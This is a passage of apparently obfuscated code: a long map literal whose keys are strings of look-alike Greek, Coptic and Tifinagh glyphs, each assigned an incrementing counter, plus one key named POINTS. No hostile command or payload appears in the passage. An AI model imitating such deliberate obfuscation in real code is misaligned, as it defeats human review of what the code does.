			"ΔⵠΔΔᐃⲆΔ": ᐃⲆ++,
			"ᐃⲆⲆΔΔⲆⲆ": ᐃⲆ++,
			"ΔⲆᐃΔᐃᐃⲆ": ᐃⲆ++,
			"ᐃⲆΔⲆⲆ": ᐃⲆ++,
			"ΔΔΔΔᐃ": ᐃⲆ++,
			"ΔΔΔⵠᐃ": ᐃⲆ++,
			"ⵠΔⲆⲆᐃ": ᐃⲆ++,
			"ⲆᐃⵠΔΔ": ᐃⲆ++,
			"ⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔᐃΔⲆᐃ": ᐃⲆ++,
			"ᐃⵠᐃⲆⵠ": ᐃⲆ++,
			"ⲆΔΔΔᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠᐃΔⲆᐃ": ᐃⲆ++,
			"ΔⵠΔⵠΔ": ᐃⲆ++,
			"ⲆΔᐃⲆᐃ": ᐃⲆ++,
			"ⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃᐃΔΔ": ᐃⲆ++,
			"ⲆΔΔⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⲆ": ᐃⲆ++,
			"ⲆΔⲆᐃᐃ": ᐃⲆ++,
			"ΔⵠΔᐃⵠᐃΔ": ᐃⲆ++,
			"ⵠⵠⵠᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃΔᐃ": ᐃⲆ++,
			"ⲆΔⲆⵠΔ": ᐃⲆ++,
			"ⲆⲆΔⵠⲆ": ᐃⲆ++,
			"ⵠⲆᐃᐃⲆⵠⵠ": ᐃⲆ++,
			"ΔⵠΔΔⲆⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆⵠⲆΔᐃ": ᐃⲆ++,
			"ΔᐃᐃᐃΔ": ᐃⲆ++,
			"ⲆⲆΔᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠΔⵠⲆΔⵠΔ": ᐃⲆ++,
			"ⵠᐃᐃᐃⵠᐃⵠ": ᐃⲆ++,
			"ⵠᐃᐃΔᐃᐃⵠ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃᐃⵠ": ᐃⲆ++,
			"ΔΔⵠΔⵠⲆⲆ": ᐃⲆ++,
			"ⵠᐃΔᐃΔΔⵠ": ᐃⲆ++,
			"ⲆᐃᐃⵠΔⲆⵠ": ᐃⲆ++,
			"ᐃⵠᐃⲆᐃ": ᐃⲆ++,
			"ⲆᐃΔᐃᐃ": ᐃⲆ++,
			"ⵠⵠⵠΔⵠ": ᐃⲆ++,
			"ΔΔᐃᐃᐃ": ᐃⲆ++,
			"ⵠΔᐃⲆⲆ": ᐃⲆ++,
			"ᐃΔⵠⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆⲆⵠΔΔ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠ": ᐃⲆ++,
			"ⲆⵠΔᐃΔΔΔ": ᐃⲆ++,
			"ⲆΔⵠΔⵠ": ᐃⲆ++,
			"ᐃⲆΔⵠᐃⲆΔ": ᐃⲆ++,
			"ᐃⵠᐃΔΔ": ᐃⲆ++,
			"ΔΔⵠⵠᐃ": ᐃⲆ++,
			"ᐃⵠⲆΔΔⲆᐃ": ᐃⲆ++,
			"ⲆΔⵠᐃⵠⲆⵠ": ᐃⲆ++,
			"ⲆⲆⲆⲆΔ": ᐃⲆ++,
			"ΔᐃⲆⵠⲆ": ᐃⲆ++,
			"ⲆⲆⵠⲆⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆⲆᐃ": ᐃⲆ++,
			"ⲆΔᐃᐃ": ᐃⲆ++,
			"ⲆΔᐃᐃⲆ": ᐃⲆ++,
			"ⲆᐃΔⵠⵠⵠᐃ": ᐃⲆ++,
			"ⵠⲆΔⲆΔ": ᐃⲆ++,
			"ᐃΔΔⲆᐃᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆᐃⵠ": ᐃⲆ++,
			"Ⲇⵠᐃᐃⵠⵠⵠ": ᐃⲆ++,
			"ΔΔΔᐃⲆ": ᐃⲆ++,
			"ⵠⵠⵠⵠⲆᐃⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃΔᐃ": ᐃⲆ++,
			"ᐃᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔⵠᐃⲆ": ᐃⲆ++,
			"ΔᐃΔᐃⵠ": ᐃⲆ++,
			"ⵠⲆΔΔⵠ": ᐃⲆ++,
			"ⵠᐃⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⵠ": ᐃⲆ++,
			"ⲆⵠΔΔⵠ": ᐃⲆ++,
			"ΔⲆᐃⲆⲆ": ᐃⲆ++,
			"ⵠΔΔⲆⵠ": ᐃⲆ++,
			"ᐃᐃΔΔⵠ": ᐃⲆ++,
			"ᐃⵠⲆΔᐃΔΔ": ᐃⲆ++,
			"ΔΔΔⲆⵠΔⵠ": ᐃⲆ++,
			"ⲆᐃⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆΔᐃᐃⵠᐃ": ᐃⲆ++,
			"ΔⵠⲆΔⵠ": ᐃⲆ++,
			"ᐃΔΔΔⵠ": ᐃⲆ++,
			"ᐃⵠᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃⲆᐃ": ᐃⲆ++,
			"ΔⵠⵠΔⲆ": ᐃⲆ++,
			"ΔⲆⲆΔᐃᐃᐃ": ᐃⲆ++,
			"ΔΔΔⲆⲆ": ᐃⲆ++,
			"ΔᐃⲆΔᐃ": ᐃⲆ++,
			"ⵠᐃⲆᐃᐃ": ᐃⲆ++,
			"ΔⲆⲆⵠⲆ": ᐃⲆ++,
			"ⵠⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔᐃΔ": ᐃⲆ++,
			"ⵠⲆⲆᐃᐃ": ᐃⲆ++,
			"ΔΔᐃΔᐃ": ᐃⲆ++,
			"ΔΔᐃΔⲆΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆⲆΔ": ᐃⲆ++,
			"ΔⵠⵠⲆᐃ": ᐃⲆ++,
			"ⲆᐃᐃⵠΔᐃΔ": ᐃⲆ++,
			"ⲆⲆⵠᐃΔ": ᐃⲆ++,
			"ⲆⵠᐃⵠⲆ": ᐃⲆ++,
			"ΔΔⵠΔⵠⲆᐃ": ᐃⲆ++,
			"ⲆᐃⲆΔᐃ": ᐃⲆ++,
			"ⵠΔⵠᐃΔ": ᐃⲆ++,
			"ΔⲆΔⲆⵠⵠΔ": ᐃⲆ++,
			"ⲆⵠⲆΔΔⲆⵠ": ᐃⲆ++,
			"ⲆⵠᐃⵠⵠⲆᐃ": ᐃⲆ++,
			"Δᐃⵠᐃᐃ": ᐃⲆ++,
			"ⲆⲆᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ⵠΔⵠⵠᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃⵠⵠⲆΔΔ": ᐃⲆ++,
			"ⵠΔᐃⲆⵠΔᐃ": ᐃⲆ++,
			"ⲆⲆⵠᐃⲆ": ᐃⲆ++,
			"ⵠⵠΔᐃᐃᐃⵠ": ᐃⲆ++,
			"ⲆᐃᐃⵠᐃⲆΔ": ᐃⲆ++,
			"Δᐃⵠᐃᐃⵠⵠ": ᐃⲆ++,
			"ᐃᐃᐃⲆᐃ": ᐃⲆ++,
			"ⲆΔΔᐃⵠᐃᐃ": ᐃⲆ++,
			"ⵠΔΔⲆⲆΔⵠ": ᐃⲆ++,
			"ⵠⵠⵠⲆᐃᐃΔ": ᐃⲆ++,
			"ᐃᐃⵠΔⲆᐃᐃ": ᐃⲆ++,
			"ΔΔⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ⲆⵠΔⵠⲆᐃΔ": ᐃⲆ++,
			"ΔΔⵠᐃⵠⲆⲆ": ᐃⲆ++,
			"ⲆⵠᐃⵠΔⲆᐃ": ᐃⲆ++,
			"ΔⵠᐃⵠⲆⵠΔ": ᐃⲆ++,
			"ΔᐃΔⵠΔⵠᐃ": ᐃⲆ++,
			"ᐃΔⲆΔⵠΔΔ": ᐃⲆ++,
			"ᐃⵠΔᐃΔΔᐃ": ᐃⲆ++,
			"ΔⲆⵠᐃΔⵠⵠ": ᐃⲆ++,
			"ⵠⵠᐃⲆΔᐃᐃ": ᐃⲆ++,
			"ⵠΔΔΔ": ᐃⲆ++,
			"ΔⲆᐃⲆᐃ": ᐃⲆ++,
			"ⵠΔΔᐃᐃⲆⵠ": ᐃⲆ++,
			"ᐃⵠⲆⵠⵠΔⵠ": ᐃⲆ++,
			"ᐃⲆ": ᐃⲆ++,
			"ΔΔᐃΔⲆⲆⵠ": ᐃⲆ++,
			"ᐃⵠᐃΔᐃ": ᐃⲆ++,
			"ΔᐃⲆᐃΔ": ᐃⲆ++,
			"ⲆᐃⲆⵠΔᐃᐃ": ᐃⲆ++,
			"ⵠⲆΔᐃΔ": ᐃⲆ++,
			"ΔⲆⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ᐃⵠⵠΔᐃⵠⵠ": ᐃⲆ++,
			"ΔⲆⵠⵠᐃᐃⲆ": ᐃⲆ++,
			"ΔⲆᐃⵠⵠΔᐃ": ᐃⲆ++,
			"ΔΔⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ⲆⲆΔΔᐃ": ᐃⲆ++,
			"ᐃⲆΔᐃⲆⲆⲆ": ᐃⲆ++,
			"ⲆΔΔᐃⵠⲆⲆ": ᐃⲆ++,
			"ⵠΔΔᐃΔᐃΔ": ᐃⲆ++,
			"ᐃⵠⵠᐃⵠᐃⵠ": ᐃⲆ++,
			"ΔⵠᐃⲆᐃ": ᐃⲆ++,
			"ΔⲆΔΔⵠⵠᐃ": ᐃⲆ++,
			"ⲆⵠᐃᐃⲆⵠⵠ": ᐃⲆ++,
			"ⵠΔΔⲆᐃΔⵠ": ᐃⲆ++,
			"ⲆⵠΔᐃⲆᐃΔ": ᐃⲆ++,
			"ⵠᐃᐃᐃⲆᐃⵠ": ᐃⲆ++,
			"ⲆΔΔᐃᐃⲆᐃ": ᐃⲆ++,
			"ᐃΔⵠΔΔᐃⵠ": ᐃⲆ++,
			"ⲆⵠⲆⵠⵠ": ᐃⲆ++,
			"ⲆⲆᐃᐃⵠⵠΔ": ᐃⲆ++,
			"ⵠⵠΔᐃΔⲆⲆ": ᐃⲆ++,
			"ΔⲆⵠⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃΔⵠᐃⵠᐃᐃ": ᐃⲆ++,
			"ⵠᐃⵠΔΔⲆΔ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔΔⲆᐃⲆ": ᐃⲆ++,
			"ΔΔᐃⲆΔΔᐃ": ᐃⲆ++,
			"ⵠⵠⲆⲆⲆⵠⲆ": ᐃⲆ++,
			"ᐃΔⲆΔᐃᐃᐃ": ᐃⲆ++,
			"ⲆΔᐃᐃⲆᐃⵠ": ᐃⲆ++,
			"ⲆⲆΔΔⲆᐃΔ": ᐃⲆ++,
			"ΔΔΔΔⲆᐃΔ": ᐃⲆ++,
			"ΔⲆⵠᐃΔ": ᐃⲆ++,
			"ⵠⵠᐃΔΔⲆⵠ": ᐃⲆ++,
			"ᐃⲆΔⵠΔᐃⵠ": ᐃⲆ++,
			"ⲆⲆΔΔⵠΔⵠ": ᐃⲆ++,
			"ⵠⲆΔᐃΔⵠΔ": ᐃⲆ++,
			"ⲆⲆⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ⵠᐃⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ᐃⵠᐃᐃⲆᐃⵠ": ᐃⲆ++,
			"ᐃⵠΔᐃΔⵠⲆ": ᐃⲆ++,
			"ⵠⲆΔΔΔⵠⵠ": ᐃⲆ++,
			"ΔⲆΔΔⵠⵠⵠ": ᐃⲆ++,
			"ᐃΔⲆⲆΔᐃⵠ": ᐃⲆ++,
			"ᐃᐃᐃΔΔΔΔ": ᐃⲆ++,
			"ⵠⲆᐃᐃⵠⲆΔ": ᐃⲆ++,
			"ⲆⵠⲆᐃⲆᐃΔ": ᐃⲆ++,
			"ⵠᐃΔᐃΔΔᐃ": ᐃⲆ++,
			"ⲆᐃΔΔⲆⲆᐃ": ᐃⲆ++,
			"ᐃⲆⲆΔⲆΔⵠ": ᐃⲆ++,
			"ᐃΔⵠΔΔᐃⲆ": ᐃⲆ++,
			"ᐃΔᐃⵠΔΔⵠ": ᐃⲆ++,
			"ⵠΔⲆᐃⲆᐃⲆ": ᐃⲆ++,
			"ⲆΔⵠΔⲆΔΔ": ᐃⲆ++,
			"ⵠⵠⲆᐃΔⵠᐃ": ᐃⲆ++,
			"ⵠⵠᐃⲆⲆⲆΔ": ᐃⲆ++,
			"ᐃᐃΔᐃΔⵠⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃΔΔⲆ": ᐃⲆ++,
			"ᐃⵠⵠΔⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ΔΔⲆⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ⲆⵠΔⲆᐃⵠᐃ": ᐃⲆ++,
			"ᐃΔᐃⵠΔⵠᐃ": ᐃⲆ++,
			"ΔᐃⵠΔⵠᐃΔ": ᐃⲆ++,
			"ᐃⵠⵠⵠΔⵠⲆ": ᐃⲆ++,
			"ⲆⵠΔΔⲆᐃⵠ": ᐃⲆ++,
			"ᐃᐃⵠⲆΔⲆᐃ": ᐃⲆ++,
			"ΔⵠᐃⵠⵠΔΔ": ᐃⲆ++,
			"ⲆⲆΔᐃⵠᐃΔ": ᐃⲆ++,
			"ΔΔⲆⲆⲆⵠᐃ": ᐃⲆ++,
			"ⲆⵠⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔⲆⵠⵠᐃ": ᐃⲆ++,
			"ᐃⵠⲆᐃⵠⲆΔ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆⵠΔ": ᐃⲆ++,
			"ΔΔⲆⲆⵠΔᐃ": ᐃⲆ++,
			"ᐃΔⲆⵠΔⵠⲆ": ᐃⲆ++,
			"ⵠᐃᐃᐃᐃⵠⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔΔⵠᐃ": ᐃⲆ++,
			"ⵠⵠΔⲆⵠᐃᐃ": ᐃⲆ++,
			"ΔⵠᐃⵠⲆⲆⵠ": ᐃⲆ++,
			"ⵠᐃᐃⵠᐃⵠⲆ": ᐃⲆ++,
			"ᐃⲆⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ᐃΔⵠⵠᐃᐃΔ": ᐃⲆ++,
			"ⲆΔΔⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔᐃⵠᐃΔⲆΔ": ᐃⲆ++,
			"ᐃΔᐃⵠⵠⲆΔ": ᐃⲆ++,
			"ΔⵠⵠΔⵠⵠΔ": ᐃⲆ++,
			"ΔΔᐃⲆᐃᐃᐃ": ᐃⲆ++,
			"ΔΔΔⲆᐃᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆΔⲆΔⲆ": ᐃⲆ++,
			"ΔᐃⵠᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆᐃⲆⵠΔⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃⵠᐃᐃⵠ": ᐃⲆ++,
			"ᐃᐃᐃΔΔᐃᐃ": ᐃⲆ++,
			"ⵠᐃᐃΔΔⲆⲆ": ᐃⲆ++,
			"ⲆⲆΔⲆⵠⵠⲆ": ᐃⲆ++,
			"ⵠⵠⲆᐃⲆᐃΔ": ᐃⲆ++,
			"ⵠΔᐃⲆΔΔᐃ": ᐃⲆ++,
			"ΔΔᐃᐃᐃΔⲆ": ᐃⲆ++,
			"ⵠᐃᐃⵠⵠᐃΔ": ᐃⲆ++,
			"ᐃᐃΔᐃΔⲆⵠ": ᐃⲆ++,
			"ⲆⵠᐃᐃⵠⲆⲆ": ᐃⲆ++,
			"ⵠᐃᐃⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠⲆᐃⲆⲆⲆ": ᐃⲆ++,
			"ⲆΔΔⵠⵠⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔⲆⲆⵠⵠⵠⵠ": ᐃⲆ++,
			"ΔΔⲆⵠΔⲆΔ": ᐃⲆ++,
			"ⵠⵠΔⲆᐃⵠΔ": ᐃⲆ++,
			"ΔΔⲆⵠⵠΔⵠ": ᐃⲆ++,
			"ⵠᐃⲆΔΔⲆⲆ": ᐃⲆ++,
			"ΔᐃⲆⵠⲆⲆΔ": ᐃⲆ++,
			"ⵠΔᐃⵠΔᐃΔ": ᐃⲆ++,
			"ΔΔⵠᐃΔΔᐃ": ᐃⲆ++,
			"ᐃΔⵠⵠΔⵠⲆ": ᐃⲆ++,
			"ᐃΔⵠⲆΔⵠᐃ": ᐃⲆ++,
			"ΔⲆⲆⲆᐃⵠⵠ": ᐃⲆ++,
			"ⵠΔⵠⵠᐃΔⵠ": ᐃⲆ++,
			"ᐃⲆΔⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⵠⵠᐃⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆⲆΔΔ": ᐃⲆ++,
			"ΔΔᐃᐃⵠΔⵠ": ᐃⲆ++,
			"ⲆΔΔΔᐃΔΔ": ᐃⲆ++,
			"ΔΔⵠΔⲆⲆΔ": ᐃⲆ++,
			"ᐃⲆⲆⵠⵠ": ᐃⲆ++,
			"ⲆᐃⲆⵠⵠᐃΔΔⵠ": ᐃⲆ++,
			"ⵠᐃⲆⲆⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⵠ": ᐃⲆ++,
			"ⵠⲆᐃΔⵠⲆⲆΔΔ": ᐃⲆ++,
			"ⲆᐃⲆⵠΔⲆΔ": ᐃⲆ++,
			"ᐃⵠⵠᐃⵠ": ᐃⲆ++,
			"ⵠΔⵠΔΔⵠⲆ": ᐃⲆ++,
			"ⵠⲆᐃΔΔⲆΔ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆΔΔ": ᐃⲆ++,
			"ⵠᐃᐃⵠⵠᐃᐃ": ᐃⲆ++,
			"ⵠΔΔⵠΔⵠΔ": ᐃⲆ++,
			"ⲆⲆΔⵠᐃⲆⲆ": ᐃⲆ++,
			"ⵠⲆᐃⲆⵠⲆΔ": ᐃⲆ++,
			"ᐃⵠᐃΔᐃᐃΔ": ᐃⲆ++,
			"ⵠᐃᐃⲆⲆⵠⵠ": ᐃⲆ++,
			"ⵠⲆⵠᐃᐃⵠⵠ": ᐃⲆ++,
			"ᐃᐃⵠⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃⲆᐃᐃⵠⲆᐃ": ᐃⲆ++,
			"ⲆⵠⵠⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠⵠᐃⲆⲆΔⲆ": ᐃⲆ++,
			"ⲆⵠΔᐃᐃⵠⵠ": ᐃⲆ++,
			"ⵠⲆᐃᐃⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃⲆⵠⲆΔ": ᐃⲆ++,
			"ⲆⵠⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ᐃΔⵠⲆⲆⵠⵠ": ᐃⲆ++,
			"ⲆⵠᐃⲆⲆΔΔ": ᐃⲆ++,
			"ᐃⲆⵠΔΔⵠⲆ": ᐃⲆ++,
			"ⵠⲆΔᐃⵠᐃΔ": ᐃⲆ++,
			"ΔⵠⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ⵠΔᐃⲆᐃⲆⲆ": ᐃⲆ++,
			"ⵠΔⲆΔⵠᐃΔΔΔ": ᐃⲆ++,
			"ⲆⵠΔᐃΔ": ᐃⲆ++,
			"ⲆΔᐃΔⵠᐃΔ": ᐃⲆ++,
			"ΔΔⲆΔΔⵠᐃ": ᐃⲆ++,
			"ᐃᐃⵠΔΔΔᐃᐃⵠ": ᐃⲆ++,
			"ΔΔⵠΔΔ": ᐃⲆ++,
			"ⲆᐃⲆᐃⵠ": ᐃⲆ++,
			"ᐃⲆᐃᐃΔⲆΔ": ᐃⲆ++,
			"ⲆⵠᐃⲆⵠΔⲆ": ᐃⲆ++,
			"ᐃⵠΔᐃⵠΔᐃ": ᐃⲆ++,
			"ΔΔⵠᐃᐃΔⲆ": ᐃⲆ++,
			"ΔⵠᐃᐃⲆᐃⲆ": ᐃⲆ++,
			"ΔⲆⲆΔⲆⲆΔ": ᐃⲆ++,
			"ⵠᐃⲆⵠⲆⲆⵠ": ᐃⲆ++,
			"ᐃⵠᐃᐃⵠⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔΔⲆⲆⲆ": ᐃⲆ++,
			"ΔⵠⲆᐃⲆⵠΔ": ᐃⲆ++,
			"ⵠⵠⲆⵠⵠΔⵠ": ᐃⲆ++,
			"ⲆⲆⵠᐃⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆᐃⲆᐃΔⵠ": ᐃⲆ++,
			"ΔΔⵠᐃⵠⵠⲆ": ᐃⲆ++,
			"ⵠⵠⲆᐃΔⵠⲆ": ᐃⲆ++,
			"ᐃⲆΔⲆᐃⲆⲆ": ᐃⲆ++,
			"ᐃΔⵠⲆⵠΔΔ": ᐃⲆ++,
			"ᐃᐃⲆⵠⲆᐃΔ": ᐃⲆ++,
			"ⵠᐃⲆΔⲆⲆⲆ": ᐃⲆ++,
			"ⲆⵠⲆᐃᐃⲆⵠ": ᐃⲆ++,
			"ⵠⲆΔᐃⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠΔⲆⵠΔΔ": ᐃⲆ++,
			"ⵠᐃⲆΔⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆᐃΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃⲆⲆΔⲆ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆΔΔ": ᐃⲆ++,
			"ⵠᐃⲆᐃΔΔⵠ": ᐃⲆ++,
			"ΔΔⲆⲆΔΔⲆ": ᐃⲆ++,
			"ⵠΔⵠᐃⵠⲆΔ": ᐃⲆ++,
			"ⵠᐃΔΔⵠⵠⵠ": ᐃⲆ++,
			"ᐃᐃⲆⲆᐃᐃΔ": ᐃⲆ++,
			"ΔⵠᐃⲆⲆⲆⵠ": ᐃⲆ++,
			"ⲆⲆⵠᐃⵠᐃᐃ": ᐃⲆ++,
			"ⵠⵠⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ΔᐃΔⲆᐃⲆⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃᐃⲆ": ᐃⲆ++,
			"ⵠᐃΔΔᐃΔᐃ": ᐃⲆ++,
			"ⲆΔᐃΔᐃⵠᐃ": ᐃⲆ++,
			"ⵠᐃᐃΔΔⲆΔ": ᐃⲆ++,
			"ⵠⲆΔΔᐃΔΔ": ᐃⲆ++,
			"ⵠᐃⲆᐃᐃⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃᐃⲆΔⵠ": ᐃⲆ++,
			"ⲆᐃⲆᐃΔⵠᐃ": ᐃⲆ++,
			"ᐃⵠⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ⵠⲆⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆᐃᐃⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆᐃⲆᐃ": ᐃⲆ++,
			"ΔⵠΔⲆⲆᐃⵠ": ᐃⲆ++,
			"ⵠⵠᐃᐃᐃᐃⲆ": ᐃⲆ++,
			"ⵠⵠⵠⵠᐃΔⵠ": ᐃⲆ++,
			"ΔⲆⲆⲆⵠᐃⲆ": ᐃⲆ++,
			"ⲆⲆΔⵠᐃⲆⵠ": ᐃⲆ++,
			"ⵠΔᐃⵠᐃⲆΔ": ᐃⲆ++,
			"ᐃΔΔⲆⵠᐃⲆ": ᐃⲆ++,
			"ΔⵠΔⲆᐃⵠΔ": ᐃⲆ++,
			"ⲆΔΔⵠᐃⵠᐃ": ᐃⲆ++,
			"ⵠⵠⲆᐃΔⵠⲆ": ᐃⲆ++,
			"ⲆⲆΔⲆⵠⲆᐃ": ᐃⲆ++,
			"ΔΔⵠⲆⵠⲆΔ": ᐃⲆ++,
			"ᐃᐃⲆⲆᐃⲆⲆ": ᐃⲆ++,
			"ⵠᐃΔᐃⵠⲆᐃ": ᐃⲆ++,
			"ⲆᐃᐃⵠⲆΔⲆ": ᐃⲆ++,
			"ΔⲆΔΔΔΔⲆ": ᐃⲆ++,
			"ΔⲆΔᐃⵠΔⵠ": ᐃⲆ++,
			"ⵠⲆⵠΔᐃᐃΔ": ᐃⲆ++,
			"ⲆⵠΔΔⵠⵠⲆ": ᐃⲆ++,
			"ⲆⲆⲆⵠΔΔⵠ": ᐃⲆ++,
			"ⵠΔⲆΔⲆᐃΔ": ᐃⲆ++,
			"ᐃΔᐃᐃⲆⲆΔ": ᐃⲆ++,
			"ⲆⵠΔⲆⲆⲆᐃ": ᐃⲆ++,
			"ΔⲆᐃⲆⲆⲆⲆ": ᐃⲆ++,
			"ⲆⲆⵠⵠⲆᐃᐃ": ᐃⲆ++,
			"ⲆⲆⵠΔⵠᐃᐃ": ᐃⲆ++,
			"ⲆⵠⵠⲆⲆΔᐃ": ᐃⲆ++,
			"ΔΔᐃΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆΔⲆΔⵠⵠ": ᐃⲆ++,
			"ⵠⲆⲆⲆΔΔΔ": ᐃⲆ++,
			"ΔⵠᐃΔⲆᐃⲆ": ᐃⲆ++,
			"ⲆᐃΔⵠΔⲆⵠ": ᐃⲆ++,
			"ⲆⲆⵠⵠⵠᐃᐃ": ᐃⲆ++,
			"ⲆⲆⵠⵠᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆⲆᐃᐃⲆⲆ": ᐃⲆ++,
			"ⵠⵠⲆⵠΔΔⲆ": ᐃⲆ++,
			"ᐃΔᐃΔΔΔᐃ": ᐃⲆ++,
			"ᐃⲆᐃΔᐃⲆⵠ": ᐃⲆ++,
			"ᐃⲆⵠΔᐃⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔⲆᐃᐃⲆ": ᐃⲆ++,
			"ΔⵠⲆⵠᐃⵠΔ": ᐃⲆ++,
			"ᐃᐃⵠᐃΔΔⲆᐃⵠ": ᐃⲆ++,
			"ⵠᐃᐃᐃⵠᐃⲆ": ᐃⲆ++,
			"ΔΔⲆᐃᐃⵠⲆ": ᐃⲆ++,
			"ⵠⲆⵠⵠⵠᐃⲆ": ᐃⲆ++,
			"ᐃⵠⵠⵠⵠⵠΔ": ᐃⲆ++,
			"ΔⵠᐃⵠΔⲆᐃΔᐃ": ᐃⲆ++,
			POINTS: ᐃⲆ++,
			"ΔⵠⵠᐃⲆᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆΔⵠⵠΔ": ᐃⲆ++,
			"ⵠᐃᐃΔΔᐃⵠ": ᐃⲆ++,
			"ⵠᐃΔⲆⵠⲆⲆ": ᐃⲆ++,
			"ⵠⲆⵠⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃᐃⲆⵠΔⲆⵠ": ᐃⲆ++,
			"ⲆⵠᐃΔⵠᐃⲆ": ᐃⲆ++,
			"ᐃⲆⵠΔⵠⲆⵠ": ᐃⲆ++,
			"ᐃⵠⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ΔⵠᐃᐃⲆΔⵠ": ᐃⲆ++,
			"ⵠⲆⵠᐃⵠⵠᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆΔⵠⵠ": ᐃⲆ++,
			"ⵠᐃᐃⵠᐃᐃΔ": ᐃⲆ++,
			"ΔⲆⵠⲆΔᐃΔ": ᐃⲆ++,
			"ⵠᐃⵠⲆΔᐃΔ": ᐃⲆ++,
			"ⲆⵠⲆⲆᐃᐃⲆ": ᐃⲆ++,
			"ⵠⵠΔΔΔⵠⵠ": ᐃⲆ++,
			"ⵠⵠΔΔΔᐃⲆ": ᐃⲆ++,
			"ⵠⲆᐃⵠΔᐃᐃ": ᐃⲆ++,
			"ⲆΔΔⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔⵠⲆⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⲆᐃᐃⵠ": ᐃⲆ++,
			"ⵠⵠᐃΔΔΔⲆ": ᐃⲆ++,
			"ⲆⲆⵠΔᐃΔⵠ": ᐃⲆ++,
			"ⲆᐃⵠᐃⵠΔΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆⵠⲆΔ": ᐃⲆ++,
			"ᐃⵠᐃᐃⲆⲆΔ": ᐃⲆ++,
			"ⵠⵠΔⵠᐃΔⲆ": ᐃⲆ++,
			"ᐃΔᐃⵠⲆⵠⲆ": ᐃⲆ++,
			"ⲆⲆᐃΔΔᐃΔ": ᐃⲆ++,
			"ⵠΔⵠΔΔᐃⵠ": ᐃⲆ++,
			"ⲆΔⲆⲆᐃᐃⵠ": ᐃⲆ++,
			"ᐃᐃᐃⵠⵠΔᐃ": ᐃⲆ++,
			"ΔⲆᐃⲆⲆⵠⲆ": ᐃⲆ++,
			"ⲆᐃⲆΔⵠᐃᐃ": ᐃⲆ++,
			"ⵠⲆΔⲆⵠΔⲆ": ᐃⲆ++,
			"ⲆⲆⲆⲆᐃΔΔ": ᐃⲆ++,
